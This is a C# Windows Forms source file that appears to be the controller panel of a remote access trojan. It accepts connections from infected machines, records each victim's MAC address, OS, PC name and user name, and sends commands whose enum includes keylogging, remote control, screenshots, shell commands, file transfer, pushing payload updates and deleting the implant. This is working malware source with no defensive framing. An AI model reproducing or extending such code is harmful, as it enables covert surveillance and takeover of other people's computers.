using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using MetroFramework.Forms;
using MetroFramework.Controls;
namespace Server
{
    enum Commands : int { Image = 0, KeyLogger, Control, MouseClick, RightMouseClick, KeyBoardClick, Update, Cmd, Directory, SubDirectory, GetDisks, Delete, Download, Upload, Run, Porcess, CloseProcess, Information, DeleteServer, CloseServer, RestartServer }
    public partial class Form1 : MetroForm
    {
        
        static List <Client> clients;
        static string UsersFile = Environment.CurrentDirectory + @"\Users.Rex";
        Listener listener;
        public Form1()
        {
           
            InitializeComponent();
            
            clients = new List<Client>();
            listener = new Listener(8);
            listener.AcceptedEvent += listener_AcceptedEvent;
            listener.RunTimeErrorEvent += listener_RunTimeErrorEvent;

            listener.Start();
         

        }


        void listener_RunTimeErrorEvent(Exception ex)
        {
            MessageBox.Show(ex.Message + "\nListener Run Time Error");
        }
       
        void UpdateGrid()
        {
            Invoke((MethodInvoker)delegate
            { 
                clientGrid.Rows.Clear();
                for (int i = 0; i < clients.Count; i++)
                {
                    clientGrid.Rows.Add();
                    clientGrid.Rows[i].Cells[0].Value = Convert.ToString(clients[i].ID);
                    clientGrid.Rows[i].Cells[1].Value = clients[i].Name;
                    if (clients[i].Name != "") clientGrid.Rows[i].Cells[1].ReadOnly = true;
                    clientGrid.Rows[i].Cells[2].Value = clients[i].EndPoint.ToString();
                    clientGrid.Rows[i].Cells[3].Value = clients[i].Mac;
                    clientGrid.Rows[i].Cells[4].Value = clients[i].OsInfo;
                    clientGrid.Rows[i].Cells[5].Value = clients[i].PcName;
                    clientGrid.Rows[i].Cells[6].Value = clients[i].UserName; 


                }
            });
        }
        void listener_AcceptedEvent(Socket s)
        {
            Client client = new Client(s);
            
           
            client.RunTimeErrorEvent += client_RunTimeErrorEvent;
            client.DisconnectedEvent += client_DisconnectedEvent;
            clients.Add(client);
            client.BeginRecive();
            client.RecievedEvent += client_RecievedEvent;
            client.Send(BitConverter.GetBytes((int)Commands.Information));
            UpdateGrid();
            
        }
        
        
        void client_RecievedEvent(Client sender, MemoryStream data)
        {
            BinaryReader br = new BinaryReader(data);
            Commands Header = (Commands)br.ReadInt32();
            if (Header == Commands.Information)
            {
                sender.OsInfo = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                sender.Mac = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                sender.PcName = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
                sender.UserName = Encoding.Unicode.GetString(br.ReadBytes(br.ReadInt32()));
            }
            FileStream Users = new FileStream(UsersFile, FileMode.OpenOrCreate);
            BinaryReader UserReader = new BinaryReader(Users);
            while (Users.Position != Users.Length)
            {
                                   
                string Mac = Encoding.Unicode.GetString(UserReader.ReadBytes(UserReader.ReadInt32()));
                string Name = Encoding.Unicode.GetString(UserReader.ReadBytes(UserReader.ReadInt32())); ;
                if (Mac == sender.Mac)
                {
                    sender.Name = Name;
                }

            }

            Users.Close();
            sender.RecievedEvent -= client_RecievedEvent;
            UpdateGrid();
        }

        void client_DisconnectedEvent(Client sender)
        {
            
            for (int i = 0; i < clients.Count; i++)
            {
                if (sender.ID == clients[i].ID)
                {
                    clients.RemoveAt(i);
                    break;
                }

            }
            UpdateGrid();
        }


        void client_RunTimeErrorEvent(Exception ex)
        {
            MessageBox.Show(ex.Message + "\nClient Run Time Error");                          
        }
        
       
       
      
        


        private void clientGrid_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                contextMenuStrip1.Show(Cursor.Position.X + 10, Cursor.Position.Y + 10);
            }
        }

       
        private void desktopToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Client client= null;
            for (int i = 0; i < clients.Count; i++)
            {

                if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                {
                    client = clients[i]; 
                }
            }
            if (client == null) return; 
            if (!client.Running)
            {
                ScreenShootForm f = new ScreenShootForm(client);
                client.Running = true; 
                f.Show();
                
             
            }
           
        }

       

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                MemoryStream ms = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(ms);
                bw.Write((int)Commands.Update);
                byte[] FileToSend = File.ReadAllBytes(openFileDialog1.FileName);
                bw.Write(FileToSend.Length);
                bw.Write(FileToSend);
                Client client = null;
                for (int i = 0; i < clients.Count; i++)
                {

                    if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                    {
                        client = clients[i];
                    }
                }
                if (client == null) return;
                if(!client.Running)
                client.Send(ms.ToArray());

            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void clientGrid_CellEndEdit(object sender, DataGridViewCellEventArgs e)
        {
            Client client = clients[e.RowIndex];
            FileStream Users = new FileStream(UsersFile, FileMode.OpenOrCreate);
            
            
            BinaryWriter Bw = new BinaryWriter(Users);

            Users.Position = Users.Length;
            byte[] MacByte = Encoding.Unicode.GetBytes(client.Mac);
            client.Name = clientGrid[e.ColumnIndex, e.RowIndex].Value.ToString();
            byte[] NamByte = Encoding.Unicode.GetBytes(client.Name);
            Bw.Write(MacByte.Length);
            Bw.Write(MacByte);
            Bw.Write(NamByte.Length);
            Bw.Write(NamByte);

            Users.Close();
           
            UpdateGrid();
        }

        private void showFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
             Client client = null;
                for (int i = 0; i < clients.Count; i++)
                {

                    if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                    {
                        client = clients[i];
                    }
                }
                if (client == null) return;
                
            string s = Environment.CurrentDirectory + @"\Users" + @"\" + client.Mac ;
            if (Directory.Exists(s))
            {
                Process p = new Process();
                p.StartInfo.FileName = s;
                p.Start();
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
         
        
            
            Client client = null;
            for (int i = 0; i < clients.Count; i++)
            {

                if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                {
                    client = clients[i];
                }
            }
            if (client == null) return;
            if (!client.Running)
                client.Send(BitConverter.GetBytes((int)Commands.DeleteServer));
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = null;
            for (int i = 0; i < clients.Count; i++)
            {

                if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                {
                    client = clients[i];
                }
            }
            if (client == null) return;
            if (!client.Running)
                client.Send(BitConverter.GetBytes((int)Commands.CloseServer));
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client client = null;
            for (int i = 0; i < clients.Count; i++)
            {

                if (clients[i].ID == Convert.ToInt32(clientGrid.SelectedRows[0].Cells[0].Value))
                {
                    client = clients[i];
                }
            }
            if (client == null) return;
            if (!client.Running)
                client.Send(BitConverter.GetBytes((int)Commands.RestartServer));

        }

        

       

        
    }
}
